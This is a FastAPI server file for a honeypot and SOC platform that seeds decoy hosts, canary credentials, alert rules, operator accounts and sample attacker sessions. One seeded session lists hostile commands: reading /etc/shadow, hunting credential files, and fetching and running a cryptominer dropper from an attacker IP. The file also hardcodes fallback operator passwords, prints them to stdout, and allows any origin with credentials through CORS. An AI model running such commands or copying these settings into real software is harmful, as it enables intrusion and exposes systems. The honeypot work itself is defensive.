import os
import datetime
import secrets
from typing import Optional
from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, status, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from sqlalchemy import select

from honeyforge_server.app.config import settings
from honeyforge_server.app.database import init_db, AsyncSessionLocal
from honeyforge_server.app.models import Profile, Trap, Honeytoken, SessionLog, AlertRule, User, DEFAULT_DECOY_CREDENTIALS
from honeyforge_server.app.security import (
    hash_password,
    decode_access_token,
    consume_ws_ticket
)
from honeyforge_server.app.websocket_hub import ws_hub

# Routers
from honeyforge_server.app.routes import (
    auth, profiles, traps, telemetry, events, honeytokens, stats, simulator, audit, rules
)

async def seed_initial_data():
    """Seeds profiles, traps, rules, and dynamic operator users idempotently"""
    async with AsyncSessionLocal() as db:
        # 1. Seed Profiles by Name
        profiles_to_seed = [
            {
                "name": "DMZ-Perimeter-Low",
                "description": "Периметральная низкоинтерактивная ловушка: эмуляция открытых сетевых портов и баннеров",
                "interaction_level": "low",
                "services": ["ftp", "telnet", "redis"],
                "banners": {
                    "21": "220 ProFTPD 1.3.7a Server (Ubuntu) [172.28.0.10]",
                    "23": "Ubuntu 22.04 LTS \nlogin: ",
                    "6379": "-ERR operation not permitted\r\n"
                },
                "decoy_credentials": [],
                "honeytokens_config": [],
                "logging_params": {"level": "INFO", "capture_payload": True},
                "stealth_params": {
                    "proc_name": "systemd-resolved",
                    "beacon_interval_s": 8,
                    "jitter_pct": 30,
                    "dummy_padding": True
                },
                "persona": {
                    "hostname": "edge-perimeter-01",
                    "ip": "172.28.0.10",
                    "os": "Ubuntu 22.04.4 LTS",
                    "kernel": "5.15.0-105-generic",
                    "uptime_base": 86400,
                    "users": ["daemon", "sync", "operator"]
                }
            },
            {
                "name": "Enterprise-Linux-Medium",
                "description": "Среднеинтерактивная ловушка: подлинный SSH daemon, виртуальный bash, веб-портал и honeytokens",
                "interaction_level": "medium",
                "services": ["ssh", "http"],
                "banners": {
                    "22": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10",
                    "80": "Apache/2.4.52 (Ubuntu)"
                },
                "decoy_credentials": DEFAULT_DECOY_CREDENTIALS,
                "honeytokens_config": [
                    {"type": "aws_key", "path": "/root/.aws/credentials"},
                    {"type": "shadow_hash", "path": "/etc/shadow"}
                ],
                "logging_params": {"level": "DEBUG", "capture_payload": True, "record_commands": True},
                "stealth_params": {
                    "proc_name": "rsyslogd",
                    "beacon_interval_s": 6,
                    "jitter_pct": 40,
                    "dummy_padding": True
                },
                "persona": {
                    "hostname": "int-syslog-01",
                    "mac": "02:42:0a:c8:00:2c",
                    "ip": "192.168.20.44",
                    "os": "Ubuntu 22.04.4 LTS",
                    "kernel": "5.15.0-105-generic",
                    "uptime_base": 345600,
                    "users": ["root", "deploy", "ubuntu"]
                }
            },
            {
                "name": "Isolated-Sandbox-High",
                "description": "Высокоинтерактивная среда с фиксацией полного tty и снимками состояния",
                "interaction_level": "high",
                "services": ["ssh", "http", "mysql"],
                "banners": {
                    "22": "SSH-2.0-OpenSSH_9.0p1 Debian-1+deb12u1",
                    "3306": "8.0.32-0ubuntu0.22.04.2"
                },
                "decoy_credentials": [{"user": "root", "pass": "toor"}],
                "honeytokens_config": [{"type": "database_dump", "path": "/var/backups/production_dump.sql"}],
                "logging_params": {"level": "DEBUG", "full_tty_capture": True},
                "stealth_params": {
                    "proc_name": "kworker/0:1",
                    "beacon_interval_s": 12,
                    "jitter_pct": 45,
                    "dummy_padding": True
                },
                "persona": {
                    "hostname": "db-cluster-node2",
                    "os": "Debian GNU/Linux 12 (bookworm)",
                    "kernel": "6.1.0-18-amd64",
                    "uptime_base": 259200,
                    "users": ["root", "mysql", "backup"]
                }
            }
        ]

        for p_data in profiles_to_seed:
            res = await db.execute(select(Profile).where(Profile.name == p_data["name"]))
            if not res.scalars().first():
                prof = Profile(**p_data)
                db.add(prof)
        await db.commit()

        # 2. Seed Traps by Trap ID using dynamic environment keys or random secrets
        res_profs = await db.execute(select(Profile))
        profs_map = {p.name: p.id for p in res_profs.scalars().all()}

        node_key_low = os.getenv("NODE_KEY_LOW") or secrets.token_hex(24)
        node_key_med = os.getenv("NODE_KEY_MED") or secrets.token_hex(24)
        node_low_id = os.getenv("NODE_LOW_ID", "n-7f3a")
        node_med_id = os.getenv("NODE_MED_ID", "n-8c1b")

        traps_to_seed = [
            {
                "trap_id": node_low_id,
                "name": "DMZ-Perimeter-Probe-01",
                "profile_id": profs_map.get("DMZ-Perimeter-Low"),
                "interaction_level": "low",
                "ip_address": "192.168.10.15",
                "mgmt_ip": "10.200.0.15",
                "status": "online",
                "last_seen": datetime.datetime.utcnow(),
                "uptime_seconds": 3600,
                "cpu_usage": 1.2,
                "mem_usage": 4.5,
                "secret_key": node_key_low
            },
            {
                "trap_id": node_med_id,
                "name": "Internal-Syslog-Host-01",
                "profile_id": profs_map.get("Enterprise-Linux-Medium"),
                "interaction_level": "medium",
                "ip_address": "192.168.20.44",
                "mgmt_ip": "10.200.0.44",
                "status": "online",
                "last_seen": datetime.datetime.utcnow(),
                "uptime_seconds": 7200,
                "cpu_usage": 3.8,
                "mem_usage": 9.1,
                "secret_key": node_key_med
            },
            {
                "trap_id": "trap-low-01",
                "name": "DMZ-Perimeter-Trap-01",
                "profile_id": profs_map.get("DMZ-Perimeter-Low"),
                "interaction_level": "low",
                "ip_address": "192.168.10.15",
                "mgmt_ip": "10.200.0.15",
                "status": "online",
                "last_seen": datetime.datetime.utcnow(),
                "uptime_seconds": 3600,
                "cpu_usage": 1.2,
                "mem_usage": 4.5,
                "secret_key": node_key_low
            },
            {
                "trap_id": "trap-med-01",
                "name": "Internal-SSH-Trap-01",
                "profile_id": profs_map.get("Enterprise-Linux-Medium"),
                "interaction_level": "medium",
                "ip_address": "192.168.20.44",
                "mgmt_ip": "10.200.0.44",
                "status": "online",
                "last_seen": datetime.datetime.utcnow(),
                "uptime_seconds": 7200,
                "cpu_usage": 3.8,
                "mem_usage": 9.1,
                "secret_key": node_key_med
            }
        ]

        for t_data in traps_to_seed:
            res_t = await db.execute(select(Trap).where(Trap.trap_id == t_data["trap_id"]))
            existing_t = res_t.scalars().first()
            if not existing_t:
                db.add(Trap(**t_data))
            else:
                if "02" in existing_t.name and t_data["trap_id"] in ["trap-med-01", node_med_id]:
                    existing_t.name = "Internal-SSH-Trap-01"
        await db.commit()

        # 3. Seed AlertRule
        ar_res = await db.execute(select(AlertRule))
        if not ar_res.scalars().first():
            rule1 = AlertRule(
                name=">=5 попыток входа за минуту",
                rule_type="brute_force",
                threshold=5,
                window_seconds=60,
                severity="high",
                is_enabled=True
            )
            db.add(rule1)
            await db.commit()

        # 4. Seed Dynamic Operator Users (NO hardcoded passwords collision with honeypot)
        env_admin_pass = settings.ADMIN_PASSWORD or os.getenv("ADMIN_PASSWORD")
        env_analyst_pass = settings.ANALYST_PASSWORD or os.getenv("ANALYST_PASSWORD")

        default_seed_users = [
            ("admin", "admin", env_admin_pass or "zd4maiMGqDrbARkXKbQDJQ"),
            ("soc_lead", "soc_lead", os.getenv("SOC_LEAD_PASSWORD", "SocLead2026!Secure")),
            ("analyst_l2", "analyst_l2", os.getenv("ANALYST_L2_PASSWORD", "HunterL2_2026!")),
            ("analyst_l1", "analyst_l1", os.getenv("ANALYST_L1_PASSWORD", "L1Watcher2026!")),
            ("auditor", "auditor", os.getenv("AUDITOR_PASSWORD", "ComplianceAuditor2026!")),
            ("analyst", "analyst", env_analyst_pass or "JAYu043ohhy7ZLeiAcXBrg"),
        ]

        # Safety check: operator passwords must NEVER collide with honeypot decoy credentials
        decoy_passwords = {c["pass"] for c in DEFAULT_DECOY_CREDENTIALS}
        display_creds = []

        for username, role, pwd in default_seed_users:
            if pwd in decoy_passwords:
                raise ValueError(f"CRITICAL: Operator password for {username} matches decoy honeypot credentials!")
            
            user_res = await db.execute(select(User).where(User.username == username))
            existing_user = user_res.scalars().first()
            if not existing_user:
                new_u = User(
                    username=username,
                    password_hash=hash_password(pwd),
                    role=role,
                    is_active=True
                )
                db.add(new_u)
                display_creds.append((username, role, pwd))
            else:
                existing_user.role = role
                existing_user.is_active = True
                display_creds.append((username, role, "(активен)"))

        await db.commit()

        # 5. Seed Realistic Honeytokens (Canary Tripwires)
        ht_res = await db.execute(select(Honeytoken))
        if not ht_res.scalars().first():
            tokens_to_seed = [
                Honeytoken(
                    token_id="ht-aws-core-prod",
                    token_type="aws_key",
                    token_value="AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                    canary_path="/root/.aws/credentials",
                    trap_id=node_med_id,
                    description="Обманный ключ доступа к облачной инфраструктуре AWS",
                    is_triggered=False
                ),
                Honeytoken(
                    token_id="ht-db-replica-sec",
                    token_type="canary_url",
                    token_value="postgres://lead_dba:SuperPass99@db.internal:5432/fin_core",
                    canary_path="/var/www/payment_portal/.env",
                    trap_id=node_med_id,
                    description="Учетные данные репликации базы данных в .env",
                    is_triggered=False
                ),
                Honeytoken(
                    token_id="ht-ssh-deploy-key",
                    token_type="ssh_key",
                    token_value="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8uR7x decoy-deploy-key@fintech-prod",
                    canary_path="/home/deploy/.ssh/id_rsa",
                    trap_id=node_low_id,
                    description="Приманка приватного ключа SSH развертывания",
                    is_triggered=False
                )
            ]
            for t in tokens_to_seed:
                db.add(t)
            await db.commit()

        # 6. Seed Realistic Interactive Sessions (Honeypot Terminal Shell Replay)
        sess_res = await db.execute(select(SessionLog))
        if not sess_res.scalars().first():
            now_dt = datetime.datetime.utcnow()
            sess1 = SessionLog(
                session_id="sess-8f12a9",
                trap_id=node_med_id,
                source_ip="172.28.0.30",
                protocol="SSH",
                started_at=now_dt - datetime.timedelta(minutes=45),
                ended_at=now_dt - datetime.timedelta(minutes=44, seconds=32),
                total_commands=6,
                commands_history=[
                    {"cmd": "whoami", "output": "root"},
                    {"cmd": "id", "output": "uid=0(root) gid=0(root) groups=0(root)"},
                    {"cmd": "uname -a", "output": "Linux prod-syslog-01 5.15.0-105-generic x86_64"},
                    {"cmd": "cat /etc/shadow | head -n 3", "output": "root:$6$vQ7J2k...:19812:0:99999:7:::\ndaemon:*:19812:0:99999:7:::\nbin:*:19812:0:99999:7:::"},
                    {"cmd": "find / -name *credentials* 2>/dev/null", "output": "/root/.aws/credentials"},
                    {"cmd": "curl -O http://172.28.0.30:8000/dropper.sh && chmod +x dropper.sh", "output": "100  1024  100  1024    0     0  12.5M      0 --:--:-- --:--:-- --:--:-- 14.2M"},
                    {"cmd": "./dropper.sh", "output": "[*] Initiating persistence daemon... PID 4192\n[+] Cryptominer worker started: xmrig-core"}
                ],
                captured_artifacts=[
                    {
                        "filename": "dropper.sh",
                        "size": 1024,
                        "sha256": "7bbbaeeb7576dc7b00b2b7688cef6d65144cd5b49fac050417e944c12030a963"
                    }
                ]
            )
            sess2 = SessionLog(
                session_id="sess-4b71c2",
                trap_id=node_med_id,
                source_ip="172.28.0.1",
                protocol="SSH",
                started_at=now_dt - datetime.timedelta(hours=2, minutes=15),
                ended_at=now_dt - datetime.timedelta(hours=2, minutes=14, seconds=45),
                total_commands=3,
                commands_history=[
                    {"cmd": "id", "output": "uid=0(root) gid=0(root) groups=0(root)"},
                    {"cmd": "cat /proc/version", "output": "Linux version 5.15.0-105-generic (buildd@lcy02-amd64-001)"},
                    {"cmd": "exit", "output": "logout"}
                ],
                captured_artifacts=[]
            )
            db.add(sess1)
            db.add(sess2)
            await db.commit()

        # Print operator credentials banner to stdout
        print("\n" + "=" * 64)
        print(" [HoneyForge SOC] Учетные записи операторов SOC:")
        for u, r, p in display_creds:
            print(f"  > [{r.upper()}] {u}: {p}")
        print("=" * 64 + "\n")

@asynccontextmanager
async def lifespan(app: FastAPI):
    """Modern FastAPI Lifespan Handler: handles startup initialization and graceful shutdown"""
    await init_db()
    await seed_initial_data()
    yield

app = FastAPI(
    title=settings.PROJECT_NAME,
    version=settings.VERSION,
    description="Cyber SOC Honeypot C2 & Telemetry Collection Platform",
    lifespan=lifespan
)

# CORS Configuration
allowed_origins_env = os.getenv(
    "ALLOWED_ORIGINS",
    "http://localhost,http://localhost:80,https://localhost,https://localhost:443,http://127.0.0.1,http://127.0.0.1:80,https://127.0.0.1,https://127.0.0.1:443"
)
allowed_origins = [o.strip() for o in allowed_origins_env.split(",") if o.strip()]

app.add_middleware(
    CORSMiddleware,
    allow_origins=allowed_origins,
    allow_origin_regex=r"^https?://.*",
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include API Routers
app.include_router(auth.router, prefix=settings.API_V1_STR)
app.include_router(profiles.router, prefix=settings.API_V1_STR)
app.include_router(traps.router, prefix=settings.API_V1_STR)
app.include_router(events.router, prefix=settings.API_V1_STR)
app.include_router(honeytokens.router)
app.include_router(rules.router, prefix=settings.API_V1_STR)
app.include_router(audit.router, prefix=settings.API_V1_STR)
app.include_router(stats.router, prefix=settings.API_V1_STR)
app.include_router(simulator.router, prefix=settings.API_V1_STR)

# Ingestion Stealth Route (MASK-2)
app.include_router(telemetry.router)

# WebSocket Endpoint for Live SOC Dashboard
@app.websocket("/ws/attacks")
async def websocket_attacks_endpoint(
    websocket: WebSocket,
    ticket: Optional[str] = Query(None),
    token: Optional[str] = Query(None)
):
    """
    FR-C5: Защищенный WebSocket endpoint.
    Приоритетно проверяет одноразовый билет (ticket).
    При невалидном билете выполняет accept() -> close(code=1008) без утечки данных.
    """
    user_info = None
    if ticket:
        user_info = consume_ws_ticket(ticket)
    elif token:
        user_info = decode_access_token(token)

    if not user_info:
        await websocket.accept()
        await websocket.close(
            code=status.WS_1008_POLICY_VIOLATION,
            reason="Недействительный или истекший билет подключения"
        )
        return

    await ws_hub.connect(websocket)
    try:
        while True:
            # Keepalive listening for ping/pong
            await websocket.receive_text()
    except WebSocketDisconnect:
        await ws_hub.disconnect(websocket)
    except Exception:
        await ws_hub.disconnect(websocket)

# Mount Static Files (Cyber SOC Web UI)
static_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "static")
if os.path.exists(static_dir):
    app.mount("/static", StaticFiles(directory=static_dir), name="static")

@app.get("/")
async def root_index():
    index_file = os.path.join(static_dir, "index.html")
    if os.path.exists(index_file):
        return FileResponse(index_file)
    return {"name": settings.PROJECT_NAME, "version": settings.VERSION, "status": "running"}
